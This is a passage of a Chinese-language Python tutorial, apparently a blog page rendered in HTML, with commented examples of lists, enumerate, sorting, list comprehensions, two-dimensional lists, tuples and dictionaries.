style="color: #abb2bf"># 使用[]直接创建列表</span></span><span class="line"><span style="color: #abb2bf">lst = [&#39;hello&#39;, &#39;world&#39;, 98, 100, 5]</span></span><span class="line"><span style="color: #abb2bf">print(lst)</span></span><span class="line"><span style="color: #abb2bf"># 可以使用内置的函数list()创建列表</span></span><span class="line"><span style="color: #abb2bf">lst2 = list(&#39;helloworld&#39;)</span></span><span class="line"><span style="color: #abb2bf">lst3 = list(range(1, 10, 2))  # 从1开始，到10结束，步长为2，不包含10</span></span><span class="line"><span style="color: #abb2bf">print(lst2)</span></span><span class="line"><span style="color: #abb2bf">print(lst3)</span></span><span class="line"><span style="color: #abb2bf"># 列表是序列中的一种，对序列的操作符，运算符，函数均可以使用</span></span><span class="line"><span style="color: #abb2bf">print(lst +lst2 +lst3)  # 序列中的相加操作</span></span><span class="line"><span style="color: #abb2bf">print(lst * 3)  # 序列的相乘操作</span></span><span class="line"><span style="color: #abb2bf">print(len(lst))</span></span><span class="line"><span style="color: #abb2bf">print(max(lst3))</span></span><span class="line"><span style="color: #abb2bf">print(min(lst3))</span></span><span class="line"><span style="color: #abb2bf">print(lst2.count(&#39;o&#39;))  # 统计o的个数</span></span><span class="line"><span style="color: #abb2bf">print(lst2.index(&#39;o&#39;))  # o在列表lst2中第一次出现的位置</span></span><span class="line"><span style="color: #abb2bf"># 序列的删除操作</span></span><span class="line"><span style="color: #abb2bf">lst4=[10,20,30]</span></span><span class="line"><span style="color: #abb2bf">print(lst4)</span></span><span class="line"><span style="color: #abb2bf">#　删除列表</span></span><span class="line"><span style="color: #abb2bf">del lst4</span></span><span class="line"><span style="color: #abb2bf">#print(lst4) # NameError: name &#39;lst4&#39; is not defined. Did you mean: &#39;lst&#39;?</span></span></code></pre></div></div></figure><h3 id="4-enumerate函数的使用语法结构"><a href="#4-enumerate函数的使用语法结构" class="headerlink" title="4.enumerate函数的使用语法结构"></a>4.enumerate函数的使用语法结构</h3><p>for index，item in enumerate(lst): </p><p>输出index和item</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf"># 示例5-6列表的遍历操作</span></span><span class="line"><span style="color: #abb2bf">lst = [&#39;hello&#39;, &#39;world&#39;, &#39;python&#39;, &#39;php&#39;]</span></span><span class="line"><span style="color: #abb2bf"># 使用遍历循环for遍历列表元素</span></span><span class="line"><span style="color: #abb2bf">for item in lst:</span></span><span class="line"><span style="color: #abb2bf">    print(item)</span></span><span class="line"><span style="color: #abb2bf"># 使用for循环，range()函数,len函数，根据索引进行遍历</span></span><span class="line"><span style="color: #abb2bf">for i in range(0, len(lst)):</span></span><span class="line"><span style="color: #abb2bf">    print(i, &#39;--&gt;&#39;, lst[i])</span></span><span class="line"><span style="color: #abb2bf"># 第三种遍历方式 enumerate()函数</span></span><span class="line"><span style="color: #abb2bf">for index, item in enumerate(lst):</span></span><span class="line"><span style="color: #abb2bf">    print(index, item)  # index是序号，不是索引</span></span><span class="line"><span style="color: #abb2bf"># 手动修改序号的起始值</span></span><span class="line"><span style="color: #abb2bf">for index, item in enumerate(lst, start=1):</span></span><span class="line"><span style="color: #abb2bf">    print(index, item)</span></span><span class="line"><span style="color: #abb2bf">print(&#39;------------&#39;)</span></span><span class="line"><span style="color: #abb2bf">for index, item in enumerate(lst, 1):</span></span><span class="line"><span style="color: #abb2bf">    print(index, item)</span></span></code></pre></div></div></figure><h3 id="5-列表的相关操作方法"><a href="#5-列表的相关操作方法" class="headerlink" title="5.列表的相关操作方法"></a>5.列表的相关操作方法</h3><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027171046283.png" alt="image-20251024160602016"></p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf"># 示例5-7列表的相关操作</span></span><span class="line"><span style="color: #abb2bf">lst = [&#39;hello&#39;, &#39;world&#39;, &#39;python&#39;]</span></span><span class="line"><span style="color: #abb2bf">print(&#39;原列表：&#39;,lst,id(lst))</span></span><span class="line"><span style="color: #abb2bf"># 增加元素的操作</span></span><span class="line"><span style="color: #abb2bf">lst.append(&#39;sql&#39;)</span></span><span class="line"><span style="color: #abb2bf">print(&#39;增加元素之后：&#39;,lst,id(lst))</span></span><span class="line"><span style="color: #abb2bf"># 使用insert（index,x）在指定的index位置上插入元素x</span></span><span class="line"><span style="color: #abb2bf">lst.insert(1,100)</span></span><span class="line"><span style="color: #abb2bf">print(lst)</span></span><span class="line"><span style="color: #abb2bf"># 列表元素的删除操作</span></span><span class="line"><span style="color: #abb2bf">lst.remove(&#39;world&#39;)</span></span><span class="line"><span style="color: #abb2bf">print(&#39;删除元素之后的列表：&#39;,lst,id(lst))</span></span><span class="line"><span style="color: #abb2bf"># 使用pop（index）根据索引将元素取出，然后再删除</span></span><span class="line"><span style="color: #abb2bf">print(lst.pop(1))</span></span><span class="line"><span style="color: #abb2bf">print(lst)</span></span><span class="line"><span style="color: #abb2bf"># 清除列表中所有的元素clear（）</span></span><span class="line"><span style="color: #abb2bf"># lst.clear()</span></span><span class="line"><span style="color: #abb2bf"># print(lst,id(lst))</span></span><span class="line"><span style="color: #abb2bf"># 列表的反向</span></span><span class="line"><span style="color: #abb2bf">lst.reverse() # 不会产生新的列表，在原列表的基础上进行的</span></span><span class="line"><span style="color: #abb2bf">print(lst)</span></span><span class="line"><span style="color: #abb2bf"># 列表的拷贝，将产生一个新的列表对象</span></span><span class="line"><span style="color: #abb2bf">new_lst=lst.copy()</span></span><span class="line"><span style="color: #abb2bf">print(lst,id(lst))</span></span><span class="line"><span style="color: #abb2bf">print(new_lst,id(new_lst))</span></span><span class="line"><span style="color: #abb2bf"># 列表元素的修改操作</span></span><span class="line"><span style="color: #abb2bf"># 根据索引进行修改元素</span></span><span class="line"><span style="color: #abb2bf">lst[1]=&#39;mysql&#39;</span></span><span class="line"><span style="color: #abb2bf">print(lst)</span></span></code></pre></div></div></figure><h3 id="6-列表排序的两种方式"><a href="#6-列表排序的两种方式" class="headerlink" title="6.列表排序的两种方式"></a>6.列表排序的两种方式</h3><h4 id="1-列表对象的sort方法"><a href="#1-列表对象的sort方法" class="headerlink" title="1.列表对象的sort方法"></a>1.列表对象的sort方法</h4><p>lst.sort(key&#x3D;None,reverse&#x3D;False)</p><p> key——&gt;表示排序的规则 </p><p>reverse——&gt;表示排序方式（默认升序）</p><h4 id="2-内置函数sorted"><a href="#2-内置函数sorted" class="headerlink" title="2.内置函数sorted()"></a>2.内置函数sorted()</h4><p>sorted(iterable,key&#x3D;None,reverse&#x3D;False)</p><p> iterable——&gt;表示的是排序的对象</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf"># 示例5-8列表的排序操作</span></span><span class="line"><span style="color: #abb2bf">lst=[4,56,3,78,40,56,89]</span></span><span class="line"><span style="color: #abb2bf">print(&#39;原列表：&#39;,lst)</span></span><span class="line"><span style="color: #abb2bf"># 排序，默认是升序</span></span><span class="line"><span style="color: #abb2bf">lst.sort() # 排序是在原列表的基础上进行的，不会产生新的列表对象</span></span><span class="line"><span style="color: #abb2bf">print(&#39;升序：&#39;,lst)</span></span><span class="line"><span style="color: #abb2bf"># 排序，降序</span></span><span class="line"><span style="color: #abb2bf">lst.sort(reverse=True)</span></span><span class="line"><span style="color: #abb2bf">print(&#39;降序：&#39;,lst)</span></span><span class="line"><span style="color: #abb2bf">print(&#39;----------------------------&#39;)</span></span><span class="line"><span style="color: #abb2bf">lst2=[&#39;banana&#39;,&#39;apple&#39;,&#39;Cat&#39;,&#39;Orange&#39;]</span></span><span class="line"><span style="color: #abb2bf">print(&#39;原列表：&#39;,lst2)</span></span><span class="line"><span style="color: #abb2bf"># 升序排序，先排大写，再排小写</span></span><span class="line"><span style="color: #abb2bf">lst2.sort()</span></span><span class="line"><span style="color: #abb2bf">print(&#39;升序：&#39;,lst2)</span></span><span class="line"><span style="color: #abb2bf"># 降序排序，先排小写，后排大写</span></span><span class="line"><span style="color: #abb2bf">lst2.sort(reverse=True)</span></span><span class="line"><span style="color: #abb2bf">print(&#39;降序：&#39;,lst2)</span></span><span class="line"><span style="color: #abb2bf"># 忽略大小写进行比较</span></span><span class="line"><span style="color: #abb2bf">lst2.sort(key=str.lower)</span></span><span class="line"><span style="color: #abb2bf">print(lst2)</span></span><span class="line"><span style="color: #abb2bf"># 示例5-9列表的排序sorted</span></span><span class="line"><span style="color: #abb2bf">lst = [4, 56, 3, 78, 40, 56, 89]</span></span><span class="line"><span style="color: #abb2bf">print(&#39;原列表：&#39;, lst)</span></span><span class="line"><span style="color: #abb2bf"># 排序</span></span><span class="line"><span style="color: #abb2bf">asc_lst = sorted(lst)</span></span><span class="line"><span style="color: #abb2bf">print(&#39;升序：&#39;, asc_lst)</span></span><span class="line"><span style="color: #abb2bf">print(&#39;原列表：&#39;, lst)</span></span><span class="line"><span style="color: #abb2bf"># 降序</span></span><span class="line"><span style="color: #abb2bf">desc_sorted = sorted(lst, reverse=True)</span></span><span class="line"><span style="color: #abb2bf">print(&#39;降序：&#39;, desc_sorted)</span></span><span class="line"><span style="color: #abb2bf">print(&#39;原列表：&#39;, lst)</span></span><span class="line"><span style="color: #abb2bf">lst2 = [&#39;banana&#39;, &#39;apple&#39;, &#39;Cat&#39;, &#39;Orange&#39;]</span></span><span class="line"><span style="color: #abb2bf">print(&#39;原列表：&#39;, lst2)</span></span><span class="line"><span style="color: #abb2bf"># 忽略大小写进行排序</span></span><span class="line"><span style="color: #abb2bf">new_lst2 = sorted(lst2, key=str.lower)</span></span><span class="line"><span style="color: #abb2bf">print(&#39;原列表：&#39;, lst2)</span></span><span class="line"><span style="color: #abb2bf">print(&#39;排序后的列表：&#39;, new_lst2)</span></span></code></pre></div></div></figure><h3 id="7-列表生成式的语法结构"><a href="#7-列表生成式的语法结构" class="headerlink" title="7.列表生成式的语法结构"></a>7.列表生成式的语法结构</h3><p>lst&#x3D;[expression for item in range] </p><p>lst&#x3D;[expression for item in range if condition]</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf"># 示例5-10列表生成式的使用</span></span><span class="line"><span style="color: #abb2bf">import random</span></span><span class="line"><span style="color: #abb2bf">lst = [item for item in range(1, 11)]</span></span><span class="line"><span style="color: #abb2bf">print(lst)</span></span><span class="line"><span style="color: #abb2bf">lst = [item * item for item in range(1, 11)]</span></span><span class="line"><span style="color: #abb2bf">print(lst)</span></span><span class="line"><span style="color: #abb2bf">lst = [random.randint(1, 100) for _ in range(10)]</span></span><span class="line"><span style="color: #abb2bf">print(lst)</span></span><span class="line"><span style="color: #abb2bf"># 从列表中选择符合条件的元素组成新的列表</span></span><span class="line"><span style="color: #abb2bf">lst = [i for i in range(10) if i % 2 == 0]</span></span><span class="line"><span style="color: #abb2bf">print(lst)</span></span></code></pre></div></div></figure><h3 id="8-二维列表"><a href="#8-二维列表" class="headerlink" title="8.二维列表"></a>8.二维列表</h3><h4 id="1-二维列表：表格数据"><a href="#1-二维列表：表格数据" class="headerlink" title="1.二维列表：表格数据"></a>1.二维列表：表格数据</h4><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027171052863.png" alt="image-20251024160745487"></p><h4 id="2-二维列表的遍历"><a href="#2-二维列表的遍历" class="headerlink" title="2.二维列表的遍历"></a>2.二维列表的遍历</h4><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027171054481.png" alt="image-20251024160758420"></p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf"># 示例5-11二维列表的遍历与列表生成式</span></span><span class="line"><span style="color: #abb2bf"># 创建二维列表</span></span><span class="line"><span style="color: #abb2bf">lst=[</span></span><span class="line"><span style="color: #abb2bf">   [&#39;城市&#39;,&#39;环比&#39;,&#39;同比&#39;],</span></span><span class="line"><span style="color: #abb2bf">   [&#39;北京&#39;,102,103],</span></span><span class="line"><span style="color: #abb2bf">   [&#39;上海&#39;,104,504],</span></span><span class="line"><span style="color: #abb2bf">   [&#39;深圳&#39;,100,39]</span></span><span class="line"><span style="color: #abb2bf">]</span></span><span class="line"><span style="color: #abb2bf">print(lst)</span></span><span class="line"><span style="color: #abb2bf"># 遍历二维列表使用双层for循环</span></span><span class="line"><span style="color: #abb2bf">for row in lst: # 行</span></span><span class="line"><span style="color: #abb2bf">    for item in row: # 列</span></span><span class="line"><span style="color: #abb2bf">        print(item,end=&#39;\t\t&#39;)</span></span><span class="line"><span style="color: #abb2bf">    print() # 换行</span></span><span class="line"><span style="color: #abb2bf"># 列表生成式生成一个4行5列的二维列表</span></span><span class="line"><span style="color: #abb2bf">lst2=[[j for j in range(5)] for i in range(4)]</span></span><span class="line"><span style="color: #abb2bf">print(lst2)</span></span></code></pre></div></div></figure><h2 id="4-元组类型"><a href="#4-元组类型" class="headerlink" title="4.元组类型"></a>4.元组类型</h2><h3 id="1-元组定义"><a href="#1-元组定义" class="headerlink" title="1.元组定义"></a>1.元组定义</h3><p>是Python中内置的不可变序列 </p><p>在Python中使用()定义元组，元素与元素之间使用英文的逗号分隔 </p><p>元组中只有一个元素的时候，逗号也不能省略</p><h3 id="2-元组的创建方式有两种"><a href="#2-元组的创建方式有两种" class="headerlink" title="2.元组的创建方式有两种"></a>2.元组的创建方式有两种</h3><h4 id="1-使用-直接创建元组"><a href="#1-使用-直接创建元组" class="headerlink" title="1.使用()直接创建元组"></a>1.使用()直接创建元组</h4><p> 语法结构如下： </p><p>元组名&#x3D;（element1，element2,……,elementN） </p><h4 id="2-使用内置函数tuple-创建元组"><a href="#2-使用内置函数tuple-创建元组" class="headerlink" title="2.使用内置函数tuple()创建元组"></a>2.使用内置函数tuple()创建元组</h4><p>语法结构如下： </p><p>元组名&#x3D;tuple(序列)</p><h4 id="3-删除元组"><a href="#3-删除元组" class="headerlink" title="3.删除元组"></a>3.删除元组</h4><p>del 元组名</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf"># 示例5-12元组的创建与删除</span></span><span class="line"><span style="color: #abb2bf"># 使用小括号创建元组</span></span><span class="line"><span style="color: #abb2bf">t=(&#39;hello&#39;,[10,20,30],&#39;python&#39;,&#39;world&#39;)</span></span><span class="line"><span style="color: #abb2bf">print(t)</span></span><span class="line"><span style="color: #abb2bf"># 使用内置函数tuple()创建元组</span></span><span class="line"><span style="color: #abb2bf">t=tuple(&#39;helloworld&#39;)</span></span><span class="line"><span style="color: #abb2bf">print(t)</span></span><span class="line"><span style="color: #abb2bf">t=tuple([10,20,30,40])</span></span><span class="line"><span style="color: #abb2bf">print(t)</span></span><span class="line"><span style="color: #abb2bf">print(&#39;10在元组中是否存在：&#39;,(10 in t))</span></span><span class="line"><span style="color: #abb2bf">print(&#39;10在元组中是否不存在：&#39;,(10 not in t))</span></span><span class="line"><span style="color: #abb2bf">print(&#39;最大值：&#39;,max(t))</span></span><span class="line"><span style="color: #abb2bf">print(&#39;最小值：&#39;,min(t))</span></span><span class="line"><span style="color: #abb2bf">print(&#39;len：&#39;,len(t))</span></span><span class="line"><span style="color: #abb2bf">print(&#39;t.index：&#39;,t.index(10))</span></span><span class="line"><span style="color: #abb2bf">print(&#39;t.count：&#39;,t.count(10))</span></span><span class="line"><span style="color: #abb2bf"># 如果元组中只有一个元素</span></span><span class="line"><span style="color: #abb2bf">t=(10)</span></span><span class="line"><span style="color: #abb2bf">print(t,type(t))</span></span><span class="line"><span style="color: #abb2bf"># 如果元组中只有一个元素，逗号不能省</span></span><span class="line"><span style="color: #abb2bf">y=(10,)</span></span><span class="line"><span style="color: #abb2bf">print(y,type(y))</span></span><span class="line"><span style="color: #abb2bf"># 元组的删除</span></span><span class="line"><span style="color: #abb2bf">del t</span></span><span class="line"><span style="color: #abb2bf"># print(t)</span></span><span class="line"><span style="color: #abb2bf"># 示例5-13元组元素的访问与遍历</span></span><span class="line"><span style="color: #abb2bf">t=(&#39;python&#39;,&#39;hello&#39;,&#39;world&#39;)</span></span><span class="line"><span style="color: #abb2bf">#　根据索引访问元组</span></span><span class="line"><span style="color: #abb2bf">print(t[0])</span></span><span class="line"><span style="color: #abb2bf">t2=t[0:3:2] # 元组支持切片操作</span></span><span class="line"><span style="color: #abb2bf">print(t2)</span></span><span class="line"><span style="color: #abb2bf"># 元组的遍历</span></span><span class="line"><span style="color: #abb2bf">for item in t:</span></span><span class="line"><span style="color: #abb2bf">    print(item)</span></span><span class="line"><span style="color: #abb2bf"># for+range()+len()</span></span><span class="line"><span style="color: #abb2bf">for i in range(len(t)):</span></span><span class="line"><span style="color: #abb2bf">    print(i,&#39;--&gt;&#39;,t[i])</span></span><span class="line"><span style="color: #abb2bf">print(&#39;--------------------&#39;)</span></span><span class="line"><span style="color: #abb2bf"># 使用enumerate()</span></span><span class="line"><span style="color: #abb2bf">for index,item in enumerate(t):</span></span><span class="line"><span style="color: #abb2bf">    print(index,&#39;--&gt;&#39;,item)</span></span><span class="line"><span style="color: #abb2bf">for index,item in enumerate(t,start=11): #　序号从11开始</span></span><span class="line"><span style="color: #abb2bf">    print(index,&#39;--&gt;&#39;,item)</span></span><span class="line"><span style="color: #abb2bf"># 示例5-14元组生成式</span></span><span class="line"><span style="color: #abb2bf">t=(i for i in range(1,4))</span></span><span class="line"><span style="color: #abb2bf">print(t)</span></span><span class="line"><span style="color: #abb2bf"># t=tuple(t)</span></span><span class="line"><span style="color: #abb2bf"># print(t)</span></span><span class="line"><span style="color: #abb2bf"># 遍历</span></span><span class="line"><span style="color: #abb2bf"># for item in t:</span></span><span class="line"><span style="color: #abb2bf">#     print(item)</span></span><span class="line"><span style="color: #abb2bf">print(t.__next__())</span></span><span class="line"><span style="color: #abb2bf">print(t.__next__())</span></span><span class="line"><span style="color: #abb2bf">print(t.__next__())</span></span><span class="line"><span style="color: #abb2bf">t=tuple(t)</span></span><span class="line"><span style="color: #abb2bf">print(t)</span></span></code></pre></div></div></figure><h4 id="4-元组和列表的区别"><a href="#4-元组和列表的区别" class="headerlink" title="4.元组和列表的区别"></a>4.元组和列表的区别</h4><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027171059146.png" alt="image-20251024160935390"></p><h2 id="5-字典类型"><a href="#5-字典类型" class="headerlink" title="5.字典类型"></a>5.字典类型</h2><h3 id="1-字典定义"><a href="#1-字典定义" class="headerlink" title="1.字典定义"></a>1.字典定义</h3><p>字典类型是根据一个信息查找另一个信息的方式构成了“键值对”，它表示索引用的键和对应的值构成的成 对关系</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027171100689.png" alt="image-20251024160951067"></p><h3 id="2-字典的创建方式"><a href="#2-字典的创建方式" class="headerlink" title="2.字典的创建方式"></a>2.字典的创建方式</h3><h4 id="1-使用-直接创建字典"><a href="#1-使用-直接创建字典" class="headerlink" title="1.使用{}直接创建字典"></a>1.使用{}直接创建字典</h4><p>d&#x3D;{key1:value1,key2:value2……}</p><h4 id="2-使用内置函数dict-创建字典"><a href="#2-使用内置函数dict-创建字典" class="headerlink" title="2.使用内置函数dict()创建字典"></a>2.使用内置函数dict()创建字典</h4><h5 id="1-通过映射函数创建字典"><a href="#1-通过映射函数创建字典" class="headerlink" title="(1)通过映射函数创建字典"></a>(1)通过映射函数创建字典</h5><p>zip(lst1,lst2)</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027171102376.png" alt="image-20251024161030732"></p><h5 id="2-使用参数创建字典"><a href="#2-使用参数创建字典" class="headerlink" title="(2)使用参数创建字典"></a>(2)使用参数创建字典</h5><p>语法结构如下： dict(key&#x3D;value1,key2&#x3D;value2……)</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf"># 示例5-15字典的创建与删除</span></span><span class="line"><span style="color: #abb2bf"># （1）创建字典</span></span><span class="line"><span style="color: #abb2bf">d = {10: &#39;cat&#39;, 20: &#39;dog&#39;, 30: &#39;pet&#39;, 20: &#39;zoo&#39;}</span></span><span class="line"><span style="color: #abb2bf">print(d)  # key相同时，value值进行了覆盖</span></span><span class="line"><span style="color: #abb2bf"># （2）zip函数</span></span><span class="line"><span style="color: #abb2bf">lst1 = [10, 20, 30, 40]</span></span><span class="line"><span style="color: #abb2bf">lst2 = [&#39;cat&#39;, &#39;dog&#39;, &#39;pet&#39;, &#39;zoo&#39;, &#39;car&#39;]</span></span><span class="line"><span style="color: #abb2bf">zipobj = zip(lst1, lst2)</span></span><span class="line"><span style="color: #abb2bf">print(zipobj)  # &lt;zip object at 0x000001CB59561580&gt;</span></span><span class="line"><span style="color: #abb2bf"># print(list(zipobj)) # [(10, &#39;cat&#39;), (20, &#39;dog&#39;), (30, &#39;pet&#39;), (40, &#39;zoo&#39;)]</span></span><span class="line"><span style="color: #abb2bf">d=dict(zipobj)</span></span><span class="line"><span style="color: #abb2bf">print(d) # {10: &#39;cat&#39;, 20: &#39;dog&#39;, 30: &#39;pet&#39;, 40: &#39;zoo&#39;}</span></span><span class="line"><span style="color: #abb2bf"># 使用参数创建字典</span></span><span class="line"><span style="color: #abb2bf">d=dict(cat=10,dog=20) # 左侧cat是key，右侧的是value</span></span><span class="line"><span style="color: #abb2bf">print(d)</span></span><span class="line"><span style="color: #abb2bf">t=(10,20,30)</span></span><span class="line"><span style="color: #abb2bf">print({t:10}) # t是key，10是value，元组是可以作为字典中的key</span></span><span class="line"><span style="color: #abb2bf"># lst=[10,20,30]</span></span><span class="line"><span style="color: #abb2bf"># print({lst:10}) # TypeError: unhashable type: &#39;list&#39;</span></span><span class="line"><span style="color: #abb2bf"># 字典属于序列</span></span><span class="line"><span style="color: #abb2bf">print(&#39;max:&#39;,max(d))</span></span><span class="line"><span style="color: #abb2bf">print(&#39;min:&#39;,min(d))</span></span><span class="line"><span style="color: #abb2bf">print(&#39;len:&#39;,len(d))</span></span><span class="line"><span style="color: #abb2bf"># 字典的删除</span></span><span class="line"><span style="color: #abb2bf">del d</span></span><span class="line"><span style="color: #abb2bf"># print(d) # NameError: name &#39;d&#39; is not defined</span></span></code></pre></div></div></figure><p><strong>注意事项：</strong>  </p><p>字典中的key是无序的，Python3.5及其之前的版本字典的key在输出时无序，但是从Python3.6版本之后 Python解释器进行了处理所以才会看到输出的顺序与添加的顺序“一致”</p><h3 id="3-字典元素的取值"><a href="#3-字典元素的取值" class="headerlink" title="3.字典元素的取值"></a>3.字典元素的取值</h3><p>d[key] 或 d.get(key)</p><h3 id="4-字典元素的遍历"><a href="#4-字典元素的遍历" class="headerlink" title="4.字典元素的遍历"></a>4.字典元素的遍历</h3><h4 id="1-遍历出key与value的元组"><a href="#1-遍历出key与value的元组" class="headerlink" title="(1)遍历出key与value的元组"></a>(1)遍历出key与value的元组</h4><p>  for element in d.items(): pass </p><h4 id="2-分别遍历出key和value"><a href="#2-分别遍历出key和value" class="headerlink" title="(2)分别遍历出key和value"></a>(2)分别遍历出key和value</h4><p>  for key,value in d.items(): </p><p>​pass</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf"># 示例5-16字典元素的访问和遍历</span></span><span class="line"><span style="color: #abb2bf">d={&#39;hello&#39;:10,&#39;world&#39;:20,&#39;python&#39;:30}</span></span><span class="line"><span style="color: #abb2bf"># 访问字典中的元素</span></span><span class="line"><span style="color: #abb2bf"># （1）使用d[key]</span></span><span class="line"><span style="color: #abb2bf">print(d[&#39;hello&#39;])</span></span><span class="line"><span style="color: #abb2bf"># （2）d.get(key)</span></span><span class="line"><span style="color: #abb2bf">print(d.get(&#39;hello&#39;))</span></span><span class="line"><span style="color: #abb2bf"># 二者之间是有区别的，如果key不存在，d[key]报错，d.get(key)可以指定默认值</span></span><span class="line"><span style="color: #abb2bf"># print(d[&#39;java&#39;]) # KeyError: &#39;java&#39;</span></span><span class="line"><span style="color: #abb2bf">print(d.get(&#39;java&#39;)) # None</span></span><span class="line"><span style="color: #abb2bf">print(d.get(&#39;java&#39;,&#39;不存在&#39;))</span></span><span class="line"><span style="color: #abb2bf"># 字典的遍历</span></span><span class="line"><span style="color: #abb2bf">for item in d.items():</span></span><span class="line"><span style="color: #abb2bf">    print(item) # key=value组成的一个元素</span></span><span class="line"><span style="color: #abb2bf"># 在使用for循环遍历时，分别获取key,value</span></span><span class="line"><span style="color: #abb2bf">for key,value in d.items():</span></span><span class="line"><span style="color: #abb2bf">    print(key,&#39;--&gt;&#39;,value)</span></span></code></pre></div></div></figure><h3 id="5-字典的相关操作方法"><a href="#5-字典的相关操作方法" class="headerlink" 